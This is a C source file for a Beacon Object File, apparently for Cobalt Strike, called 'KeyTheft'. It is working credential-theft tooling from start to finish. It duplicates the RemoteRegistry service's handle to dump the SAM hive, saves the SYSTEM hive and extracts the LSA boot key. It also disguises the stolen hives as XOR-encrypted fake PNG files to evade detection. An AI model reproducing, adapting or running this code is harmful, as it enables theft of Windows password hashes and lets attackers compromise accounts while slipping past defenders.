#include <windows.h>
#include "beacon.h"

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#define SystemExtendedHandleInformation 64
#define KeyNameInformationClass 3

typedef struct _KEY_NAME_INFORMATION {
    ULONG NameLength;
    WCHAR Name[1];
} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID       Object;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   HandleValue;
    ULONG       GrantedAccess;
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;
    ULONG       HandleAttributes;
    ULONG       Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

static const WCHAR SAM_KEY_PATH[] = L"\\REGISTRY\\MACHINE\\SAM";
static const ULONG SAM_KEY_PATH_LEN = 21;

static const char HEXA[17] = "0123456789abcdef";

static const BYTE PNG_SIG[8] = { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A };

void *memcpy(void *dst, const void *src, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
    return dst;
}

void *memset(void *dst, int c, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    while (n--) *d++ = (unsigned char)c;
    return dst;
}

void *memmove(void *dst, const void *src, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    if (d < s) {
        while (n--) *d++ = *s++;
    } else {
        d += n;
        s += n;
        while (n--) *--d = *--s;
    }
    return dst;
}

NTSTATUS NTAPI __declspec(dllimport) NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
NTSTATUS NTAPI __declspec(dllimport) NTDLL$NtDuplicateObject(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
NTSTATUS NTAPI __declspec(dllimport) NTDLL$NtQueryKey(HANDLE, ULONG, PVOID, ULONG, PULONG);
NTSTATUS NTAPI __declspec(dllimport) NTDLL$NtSaveKey(HANDLE, HANDLE);
NTSTATUS NTAPI __declspec(dllimport) NTDLL$NtClose(HANDLE);

HANDLE NTAPI __declspec(dllimport) KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
BOOL NTAPI __declspec(dllimport) KERNEL32$CloseHandle(HANDLE);
HANDLE NTAPI __declspec(dllimport) KERNEL32$GetCurrentProcess(VOID);
DWORD NTAPI __declspec(dllimport) KERNEL32$GetCurrentProcessId(VOID);
DWORD NTAPI __declspec(dllimport) KERNEL32$GetLastError(VOID);
HANDLE NTAPI __declspec(dllimport) KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
BOOL NTAPI __declspec(dllimport) KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
BOOL NTAPI __declspec(dllimport) KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DWORD NTAPI __declspec(dllimport) KERNEL32$GetFileSize(HANDLE, LPDWORD);
BOOL NTAPI __declspec(dllimport) KERNEL32$DeleteFileW(LPCWSTR);
BOOL NTAPI __declspec(dllimport) KERNEL32$MoveFileW(LPCWSTR, LPCWSTR);
UINT NTAPI __declspec(dllimport) KERNEL32$GetSystemDirectoryW(LPWSTR, UINT);
BOOL NTAPI __declspec(dllimport) KERNEL32$CreateProcessW(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DWORD NTAPI __declspec(dllimport) KERNEL32$WaitForSingleObject(HANDLE, DWORD);
void NTAPI __declspec(dllimport) KERNEL32$Sleep(DWORD);

void *NTAPI __declspec(dllimport) MSVCRT$malloc(size_t);
void NTAPI __declspec(dllimport) MSVCRT$free(void *);
void *NTAPI __declspec(dllimport) MSVCRT$memset(void *, int, size_t);
int NTAPI __declspec(dllimport) MSVCRT$sprintf(char *, const char *, ...);
unsigned long NTAPI __declspec(dllimport) MSVCRT$wcstoul(const wchar_t *, wchar_t **, int);
int NTAPI __declspec(dllimport) MSVCRT$_wcsnicmp(const wchar_t *, const wchar_t *, size_t);

BOOL NTAPI __declspec(dllimport) ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
BOOL NTAPI __declspec(dllimport) ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
BOOL NTAPI __declspec(dllimport) ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
BOOLEAN NTAPI __declspec(dllimport) ADVAPI32$SystemFunction036(PVOID, ULONG);
LSTATUS NTAPI __declspec(dllimport) ADVAPI32$RegConnectRegistryW(LPCWSTR, HKEY, PHKEY);
LSTATUS NTAPI __declspec(dllimport) ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
LSTATUS NTAPI __declspec(dllimport) ADVAPI32$RegCloseKey(HKEY);
LSTATUS NTAPI __declspec(dllimport) ADVAPI32$RegQueryInfoKeyW(HKEY, LPWSTR, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD, LPDWORD);
SC_HANDLE NTAPI __declspec(dllimport) ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
SC_HANDLE NTAPI __declspec(dllimport) ADVAPI32$OpenServiceW(SC_HANDLE, LPCWSTR, DWORD);
BOOL NTAPI __declspec(dllimport) ADVAPI32$QueryServiceStatusEx(SC_HANDLE, int, LPBYTE, DWORD, LPDWORD);
BOOL NTAPI __declspec(dllimport) ADVAPI32$QueryServiceConfigW(SC_HANDLE, LPQUERY_SERVICE_CONFIGW, DWORD, LPDWORD);
BOOL NTAPI __declspec(dllimport) ADVAPI32$ChangeServiceConfigW(SC_HANDLE, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR);
BOOL NTAPI __declspec(dllimport) ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR *);
BOOL NTAPI __declspec(dllimport) ADVAPI32$ControlService(SC_HANDLE, DWORD, LPSERVICE_STATUS);
BOOL NTAPI __declspec(dllimport) ADVAPI32$CloseServiceHandle(SC_HANDLE);

static ULONG WLen(const WCHAR * s)
{
    ULONG n = 0;
    while (s[n]) n++;
    return n;
}

static void WCpy(WCHAR * dst, const WCHAR * src, ULONG max)
{
    ULONG i = 0;
    for (; src[i] && i < max - 1; i++)
        dst[i] = src[i];
    dst[i] = 0;
}

static void WCat(WCHAR * dst, const WCHAR * src, ULONG max)
{
    WCpy(dst + WLen(dst), src, max - WLen(dst));
}

static void HexToAscii(const BYTE * key, ULONG len, char * out)
{
    for (ULONG i = 0; i < len; i++) {
        out[i * 2] = HEXA[key[i] >> 4];
        out[i * 2 + 1] = HEXA[key[i] & 0x0F];
    }
    out[len * 2] = 0;
}

static BOOL EnablePriv(LPCWSTR name)
{
    HANDLE hTok;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return FALSE;
    if (!ADVAPI32$LookupPrivilegeValueW(NULL, name, &luid)) {
        KERNEL32$CloseHandle(hTok);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    ADVAPI32$AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
    BOOL ok = (KERNEL32$GetLastError() == ERROR_SUCCESS);
    KERNEL32$CloseHandle(hTok);
    return ok;
}

static PVOID QueryHandleTable(ULONG * count)
{
    ULONG sz = 0x400000;
    PVOID info;
    NTSTATUS st = STATUS_INFO_LENGTH_MISMATCH;
    while (1) {
        info = MSVCRT$malloc(sz);
        if (!info) return NULL;
        st = NTDLL$NtQuerySystemInformation(SystemExtendedHandleInformation, info, sz, NULL);
        if (NT_SUCCESS(st)) {
            *count = (ULONG)((PSYSTEM_HANDLE_INFORMATION_EX)info)->NumberOfHandles;
            return info;
        }
        MSVCRT$free(info);
        if (st != STATUS_INFO_LENGTH_MISMATCH || sz >= 0x40000000)
            return NULL;
        sz *= 2;
    }
}

static USHORT DetectKeyTypeIndex(void)
{
    HKEY hk;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_READ, &hk) != ERROR_SUCCESS)
        return 0;

    USHORT idx = 0;
    ULONG count = 0;
    PSYSTEM_HANDLE_INFORMATION_EX info = (PSYSTEM_HANDLE_INFORMATION_EX)QueryHandleTable(&count);
    if (info) {
        DWORD myPid = KERNEL32$GetCurrentProcessId();
        for (ULONG i = 0; i < count; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * e = &info->Handles[i];
            if ((ULONG_PTR)e->UniqueProcessId == (ULONG_PTR)myPid &&
                (ULONG_PTR)e->HandleValue == (ULONG_PTR)hk) {
                idx = e->ObjectTypeIndex;
                break;
            }
        }
        MSVCRT$free(info);
    }
    ADVAPI32$RegCloseKey(hk);
    return idx;
}

static BOOL StealAndSave(DWORD targetPid, USHORT keyTypeIdx,
                         LPCWSTR keyPath, ULONG keyPathLen,
                         LPCWSTR outFile, const char * outLabel)
{
    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, targetPid);
    if (!hProc) {
        BeaconPrintf(0, "  [-] OpenProcess(%lu) failed: %lu\n", targetPid, KERNEL32$GetLastError());
        return FALSE;
    }

    ULONG count = 0;
    PSYSTEM_HANDLE_INFORMATION_EX info = (PSYSTEM_HANDLE_INFORMATION_EX)QueryHandleTable(&count);
    if (!info) {
        KERNEL32$CloseHandle(hProc);
        BeaconPrintf(0, "  [-] handle table query failed\n");
        return FALSE;
    }

    HANDLE hFile = KERNEL32$CreateFileW(outFile, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(0, "  [-] CreateFile(%s) failed: %lu\n", outLabel, KERNEL32$GetLastError());
        MSVCRT$free(info);
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }

    BOOL found = FALSE;
    ULONG checked = 0;

    for (ULONG i = 0; i < count && !found; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * e = &info->Handles[i];
        if ((ULONG_PTR)e->UniqueProcessId != (ULONG_PTR)targetPid) continue;
        if (e->ObjectTypeIndex != keyTypeIdx) continue;
        if ((e->GrantedAccess & (KEY_READ | 0x80000000UL)) == 0) continue;

        HANDLE hDup = NULL;
        NTSTATUS st = NTDLL$NtDuplicateObject(hProc, (HANDLE)(e->HandleValue),
            KERNEL32$GetCurrentProcess(), &hDup, 0, 0, DUPLICATE_SAME_ACCESS);
        if (!NT_SUCCESS(st) || !hDup) continue;
        checked++;

        ULONG need = 0;
        st = NTDLL$NtQueryKey(hDup, KeyNameInformationClass, NULL, 0, &need);
        if (st != STATUS_BUFFER_TOO_SMALL || need == 0 || need > 0x2000) {
            NTDLL$NtClose(hDup);
            continue;
        }

        BYTE * buf = (BYTE *)MSVCRT$malloc(need);
        if (!buf) { NTDLL$NtClose(hDup); continue; }

        st = NTDLL$NtQueryKey(hDup, KeyNameInformationClass, buf, need, &need);
        if (NT_SUCCESS(st)) {
            PKEY_NAME_INFORMATION kni = (PKEY_NAME_INFORMATION)buf;
            ULONG chars = kni->NameLength / sizeof(WCHAR);
            if (chars == keyPathLen &&
                MSVCRT$_wcsnicmp(kni->Name, keyPath, keyPathLen) == 0) {
                BeaconPrintf(0, "  [+] FOUND %s handle 0x%llX access 0x%08lX\n",
                    outLabel, (unsigned long long)e->HandleValue, e->GrantedAccess);
                st = NTDLL$NtSaveKey(hDup, hFile);
                if (NT_SUCCESS(st)) {
                    found = TRUE;
                } else {
                    BeaconPrintf(0, "  [!] NtSaveKey 0x%08lX, trying next handle\n", (ULONG)st);
                }
            }
        }
        MSVCRT$free(buf);
        NTDLL$NtClose(hDup);
    }

    KERNEL32$CloseHandle(hFile);
    MSVCRT$free(info);
    KERNEL32$CloseHandle(hProc);

    if (!found) {
        BeaconPrintf(0, "  [-] %s handle not found (%lu keys checked)\n", outLabel, checked);
        KERNEL32$DeleteFileW(outFile);
    }
    return found;
}

static BOOL SaveSystem(LPCWSTR outFile)
{
    HKEY hk;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hk) != ERROR_SUCCESS)
        return FALSE;
    HANDLE hFile = KERNEL32$CreateFileW(outFile, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ADVAPI32$RegCloseKey(hk);
        return FALSE;
    }
    NTSTATUS st = NTDLL$NtSaveKey(hk, hFile);
    KERNEL32$CloseHandle(hFile);
    ADVAPI32$RegCloseKey(hk);
    if (!NT_SUCCESS(st)) {
        KERNEL32$DeleteFileW(outFile);
        return FALSE;
    }
    return TRUE;
}

typedef struct {
    DWORD pid;
    DWORD origStart;
    BOOL reconfigured;
    BOOL startedByUs;
} SVCSTATE;

static DWORD AcquireService(LPCWSTR name, SVCSTATE * st)
{
    MSVCRT$memset(st, 0, sizeof(SVCSTATE));
    SC_HANDLE hScm = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hScm) return 0;
    SC_HANDLE hSvc = ADVAPI32$OpenServiceW(hScm, name,
        SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG);
    if (!hSvc) {
        ADVAPI32$CloseServiceHandle(hScm);
        return 0;
    }

    BYTE cfgBuf[2048];
    DWORD cfgNeed;
    if (ADVAPI32$QueryServiceConfigW(hSvc, (LPQUERY_SERVICE_CONFIGW)cfgBuf, sizeof(cfgBuf), &cfgNeed))
        st->origStart = ((LPQUERY_SERVICE_CONFIGW)cfgBuf)->dwStartType;

    BYTE sspBuf[36];
    DWORD sspNeed;
    if (!ADVAPI32$QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, sspBuf, sizeof(sspBuf), &sspNeed)) {
        ADVAPI32$CloseServiceHandle(hSvc);
        ADVAPI32$CloseServiceHandle(hScm);
        return 0;
    }
    DWORD state = ((LPSERVICE_STATUS_PROCESS)sspBuf)->dwCurrentState;

    if (state != SERVICE_RUNNING) {
        if (!ADVAPI32$StartServiceW(hSvc, 0, NULL)) {
            DWORD err = KERNEL32$GetLastError();
            if (err == ERROR_SERVICE_DISABLED) {
                if (!ADVAPI32$ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE,
                        SERVICE_DEMAND_START, SERVICE_NO_CHANGE,
                        NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
                    BeaconPrintf(0, "  [-] ChangeServiceConfig failed: %lu\n", KERNEL32$GetLastError());
                    ADVAPI32$CloseServiceHandle(hSvc);
                    ADVAPI32$CloseServiceHandle(hScm);
                    return 0;
                }
                st->reconfigured = TRUE;
                if (!ADVAPI32$StartServiceW(hSvc, 0, NULL)) {
                    BeaconPrintf(0, "  [-] StartService failed: %lu\n", KERNEL32$GetLastError());
                    ADVAPI32$CloseServiceHandle(hSvc);
                    ADVAPI32$CloseServiceHandle(hScm);
                    return 0;
                }
                st->startedByUs = TRUE;
            } else if (err != ERROR_SERVICE_ALREADY_RUNNING) {
                BeaconPrintf(0, "  [-] StartService failed: %lu\n", err);
                ADVAPI32$CloseServiceHandle(hSvc);
                ADVAPI32$CloseServiceHandle(hScm);
                return 0;
            }
        } else {
            st->startedByUs = TRUE;
        }
        for (int t = 0; t < 20; t++) {
            KERNEL32$Sleep(250);
            if (!ADVAPI32$QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, sspBuf, sizeof(sspBuf), &sspNeed))
                break;
            if (((LPSERVICE_STATUS_PROCESS)sspBuf)->dwCurrentState == SERVICE_RUNNING)
                break;
        }
        if (((LPSERVICE_STATUS_PROCESS)sspBuf)->dwCurrentState != SERVICE_RUNNING) {
            ADVAPI32$CloseServiceHandle(hSvc);
            ADVAPI32$CloseServiceHandle(hScm);
            return 0;
        }
    }

    DWORD pid = ((LPSERVICE_STATUS_PROCESS)sspBuf)->dwProcessId;
    ADVAPI32$CloseServiceHandle(hSvc);
    ADVAPI32$CloseServiceHandle(hScm);
    st->pid = pid;
    return pid;
}

static void ReleaseService(LPCWSTR name, SVCSTATE * st)
{
    if (!st->reconfigured && !st->startedByUs) return;

    SC_HANDLE hScm = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hScm) return;
    SC_HANDLE hSvc = ADVAPI32$OpenServiceW(hScm, name, SERVICE_ALL_ACCESS);
    if (!hSvc) {
        ADVAPI32$CloseServiceHandle(hScm);
        return;
    }

    if (st->startedByUs) {
        SERVICE_STATUS ss;
        if (!ADVAPI32$ControlService(hSvc, SERVICE_STOP, &ss) &&
            KERNEL32$GetLastError() == ERROR_ACCESS_DENIED) {
            WCHAR sysdir[MAX_PATH];
            WCHAR cmd[MAX_PATH + 80];
            KERNEL32$GetSystemDirectoryW(sysdir, MAX_PATH);
            WCpy(cmd, L"\"", MAX_PATH + 80);
            WCat(cmd, sysdir, MAX_PATH + 80);
            WCat(cmd, L"\\sc.exe\" stop ", MAX_PATH + 80);
            WCat(cmd, name, MAX_PATH + 80);

            STARTUPINFOW si;
            PROCESS_INFORMATION pi;
            MSVCRT$memset(&si, 0, sizeof(si));
            MSVCRT$memset(&pi, 0, sizeof(pi));
            si.cb = sizeof(si);
            if (KERNEL32$CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                KERNEL32$WaitForSingleObject(pi.hProcess, 10000);
                KERNEL32$CloseHandle(pi.hThread);
                KERNEL32$CloseHandle(pi.hProcess);
            } else {
                BeaconPrintf(0, "  [!] sc.exe spawn failed: %lu\n", KERNEL32$GetLastError());
            }
        }
        BYTE sspBuf[36];
        DWORD sspNeed;
        BOOL stopped = FALSE;
        for (int t = 0; t < 20; t++) {
            KERNEL32$Sleep(250);
            if (!ADVAPI32$QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, sspBuf, sizeof(sspBuf), &sspNeed))
                break;
            if (((LPSERVICE_STATUS_PROCESS)sspBuf)->dwCurrentState == SERVICE_STOPPED) {
                stopped = TRUE;
                break;
            }
        }
        if (!stopped)
            BeaconPrintf(0, "  [!] service not fully stopped after restore\n");
    }
    if (st->reconfigured && st->origStart != SERVICE_DEMAND_START && st->origStart != 0) {
        ADVAPI32$ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE, st->origStart,
            SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    ADVAPI32$CloseServiceHandle(hSvc);
    ADVAPI32$CloseServiceHandle(hScm);
}

static ULONG Crc32(const BYTE * d, ULONG len)
{
    ULONG c = 0xFFFFFFFFu;
    for (ULONG i = 0; i < len; i++) {
        c ^= d[i];
        for (int k = 0; k < 8; k++)
            c = (c & 1) ? (c >> 1) ^ 0xEDB88320u : c >> 1;
    }
    return ~c;
}

static BOOL PackPng(LPCWSTR srcPath, LPCWSTR dstPath, BOOL deleteSrc)
{
    HANDLE hIn = KERNEL32$CreateFileW(srcPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dataSize = KERNEL32$GetFileSize(hIn, NULL);
    if (dataSize == INVALID_FILE_SIZE || dataSize == 0) {
        KERNEL32$CloseHandle(hIn);
        return FALSE;
    }

    BYTE * data = (BYTE *)MSVCRT$malloc(dataSize);
    if (!data) {
        KERNEL32$CloseHandle(hIn);
        return FALSE;
    }

    DWORD rd = 0;
    if (!KERNEL32$ReadFile(hIn, data, dataSize, &rd, NULL) || rd != dataSize) {
        MSVCRT$free(data);
        KERNEL32$CloseHandle(hIn);
        return FALSE;
    }
    KERNEL32$CloseHandle(hIn);

    BYTE key[16];
    ADVAPI32$SystemFunction036(key, sizeof(key));
    for (DWORD i = 0; i < dataSize; i++)
        data[i] ^= key[i % sizeof(key)];

    BYTE ihdr[25];
    MSVCRT$memset(ihdr, 0, sizeof(ihdr));
    ihdr[3] = 13;
    ihdr[4] = 'I'; ihdr[5] = 'H'; ihdr[6] = 'D'; ihdr[7] = 'R';
    ihdr[11] = 1;
    ihdr[15] = 1;
    ihdr[16] = 8;
    ihdr[17] = 6;
    ULONG crc = Crc32(ihdr + 4, 17);
    ihdr[21] = (BYTE)(crc >> 24);
    ihdr[22] = (BYTE)(crc >> 16);
    ihdr[23] = (BYTE)(crc >> 8);
    ihdr[24] = (BYTE)crc;

    HANDLE hOut = KERNEL32$CreateFileW(dstPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        MSVCRT$free(data);
        return FALSE;
    }
    DWORD wr = 0;
    BOOL ok = KERNEL32$WriteFile(hOut, PNG_SIG, sizeof(PNG_SIG), &wr, NULL) && wr == sizeof(PNG_SIG)
           && KERNEL32$WriteFile(hOut, ihdr, sizeof(ihdr), &wr, NULL) && wr == sizeof(ihdr)
           && KERNEL32$WriteFile(hOut, data, dataSize, &wr, NULL) && wr == dataSize;
    KERNEL32$CloseHandle(hOut);
    MSVCRT$free(data);

    if (!ok) {
        KERNEL32$DeleteFileW(dstPath);
        return FALSE;
    }

    char hex[40];
    HexToAscii(key, sizeof(key), hex);
    BeaconPrintf(0, "  [x] KEY: %s\n", hex);

    if (deleteSrc)
        KERNEL32$DeleteFileW(srcPath);
    return TRUE;
}

static BOOL ExtractBootKey(BYTE bootKey[16])
{
    static const LPCWSTR names[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    static const BYTE perm[16] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
    WCHAR hexBuf[64];
    ULONG pos = 0;

    for (int i = 0; i < 4; i++) {
        WCHAR path[256];
        WCpy(path, L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\", 256);
        WCat(path, names[i], 256);

        HKEY hk;
        if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hk) != ERROR_SUCCESS)
            return FALSE;
        WCHAR cls[64];
        DWORD clsLen = 64;
        LSTATUS r = ADVAPI32$RegQueryInfoKeyW(hk, cls, &clsLen, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        ADVAPI32$RegCloseKey(hk);
        if (r != ERROR_SUCCESS) return FALSE;
        for (DWORD j = 0; j < clsLen && pos < 32; j++)
            hexBuf[pos++] = cls[j];
    }
    hexBuf[pos] = 0;
    if (pos != 32) return FALSE;

    BYTE scrambled[16];
    for (int i = 0; i < 16; i++) {
        WCHAR pair[3] = { hexBuf[i * 2], hexBuf[i * 2 + 1], 0 };
        scrambled[i] = (BYTE)MSVCRT$wcstoul(pair, NULL, 16);
    }
    for (int i = 0; i < 16; i++)
        bootKey[i] = scrambled[perm[i]];
    return TRUE;
}

static char * NextToken(char ** p)
{
    char * s = *p;
    while (*s == ' ') s++;
    if (*s == 0) {
        *p = s;
        return NULL;
    }
    char * t = s;
    while (*s && *s != ' ') s++;
    if (*s) {
        *s = 0;
        s++;
    }
    *p = s;
    return t;
}

static void AsciiToWide(const char * src, WCHAR * dst, ULONG max)
{
    ULONG i = 0;
    for (; src[i] && i < max - 1; i++)
        dst[i] = (WCHAR)(unsigned char)src[i];
    dst[i] = 0;
}

void go(char * args, int alen)
{
    (void)alen;
    char * p = args;
    if (!p) p = (char *)"";

    BOOL packPng = TRUE;
    BOOL keepTemp = FALSE;
    char * samPath = NULL;
    char * sysPath = NULL;

    char * tok;
    while ((tok = NextToken(&p)) != NULL) {
        if (tok[0] == 'p' && tok[1] == '=') packPng = (tok[2] == '1');
        else if (tok[0] == 'k' && tok[1] == '=') keepTemp = (tok[2] == '1');
        else if (tok[0] == 's' && tok[1] == 'a' && tok[2] == 'm' && tok[3] == '=') samPath = tok + 4;
        else if (tok[0] == 's' && tok[1] == 'y' && tok[2] == 's' && tok[3] == '=') sysPath = tok + 4;
    }

    if (!samPath && !sysPath) {
        BeaconPrintf(0, "[!] usage: go p=<1|0> k=<0|1> sam=<path> sys=<path>\n");
        BeaconPrintf(0, "[!] p: XOR+PNG pack (default 1), k: keep plaintext .tmp (default 0)\n");
        return;
    }

    BeaconPrintf(0, "[*] KeyTheft BOF\n");

    if (!EnablePriv(L"SeDebugPrivilege") || !EnablePriv(L"SeBackupPrivilege")) {
        BeaconPrintf(0, "[-] privilege enable failed (needs elevated agent)\n");
        return;
    }

    USHORT typeIdx = DetectKeyTypeIndex();
    if (!typeIdx) {
        BeaconPrintf(0, "[-] key type index detection failed\n");
        return;
    }
    BeaconPrintf(0, "[+] key type index %u\n", typeIdx);

    BOOL samOk = FALSE;
    BOOL sysOk = FALSE;

    if (samPath) {
        WCHAR samTmpW[300];
        WCHAR samOutW[300];
        AsciiToWide(samPath, samTmpW, 296);
        WCpy(samOutW, samTmpW, 300);
        WCat(samTmpW, L".tmp", 300);

        SVCSTATE st;
        DWORD pid = AcquireService(L"RemoteRegistry", &st);
        if (pid) {
            BeaconPrintf(0, "[+] RemoteRegistry pid %lu\n", pid);
            HKEY hRemote;
            if (ADVAPI32$RegConnectRegistryW(L"\\\\localhost", HKEY_LOCAL_MACHINE, &hRemote) == ERROR_SUCCESS) {
                HKEY hSam;
                if (ADVAPI32$RegOpenKeyExW(hRemote, L"SAM", 0, KEY_READ, &hSam) == ERROR_SUCCESS) {
                    samOk = StealAndSave(pid, typeIdx, SAM_KEY_PATH, SAM_KEY_PATH_LEN, samTmpW, samPath);
                    ADVAPI32$RegCloseKey(hSam);
                } else {
                    BeaconPrintf(0, "  [-] remote SAM open failed\n");
                }
                ADVAPI32$RegCloseKey(hRemote);
            } else {
                BeaconPrintf(0, "  [-] RegConnectRegistryW failed\n");
            }
            ReleaseService(L"RemoteRegistry", &st);
            BeaconPrintf(0, "[+] RemoteRegistry restored\n");
        } else {
            BeaconPrintf(0, "  [-] RemoteRegistry unavailable\n");
        }

        if (samOk) {
            if (packPng) {
                if (PackPng(samTmpW, samOutW, TRUE))
                    BeaconPrintf(0, "  [+] packed %s\n", samPath);
            } else {
                KERNEL32$MoveFileW(samTmpW, samOutW);
            }
            if (keepTemp) {
                WCHAR keep[300];
                AsciiToWide(samPath, keep, 292);
                WCat(keep, L".tmp", 300);
                KERNEL32$MoveFileW(samTmpW, keep);
            }
        }
    }

    if (sysPath) {
        WCHAR sysTmpW[300];
        WCHAR sysOutW[300];
        AsciiToWide(sysPath, sysTmpW, 296);
        WCpy(sysOutW, sysTmpW, 300);
        WCat(sysTmpW, L".tmp", 300);

        sysOk = SaveSystem(sysTmpW);
        if (sysOk)
            BeaconPrintf(0, "  [+] SYSTEM hive captured\n");
        else
            BeaconPrintf(0, "  [-] SYSTEM hive failed\n");

        if (sysOk) {
            if (packPng) {
                if (PackPng(sysTmpW, sysOutW, TRUE))
                    BeaconPrintf(0, "  [+] packed %s\n", sysPath);
            } else {
                KERNEL32$MoveFileW(sysTmpW, sysOutW);
            }
            if (keepTemp) {
                WCHAR keep[300];
                AsciiToWide(sysPath, keep, 292);
                WCat(keep, L".tmp", 300);
                KERNEL32$MoveFileW(sysTmpW, keep);
            }
        }
    }

    BYTE bootKey[16];
    if (ExtractBootKey(bootKey)) {
        char hex[40];
        HexToAscii(bootKey, 16, hex);
        BeaconPrintf(0, "[+] boot key %s\n", hex);
    }

    BeaconPrintf(0, "[*] DONE sam=%s system=%s\n",
        samPath ? (samOk ? "OK" : "FAIL") : "skip",
        sysPath ? (sysOk ? "OK" : "FAIL") : "skip");
}
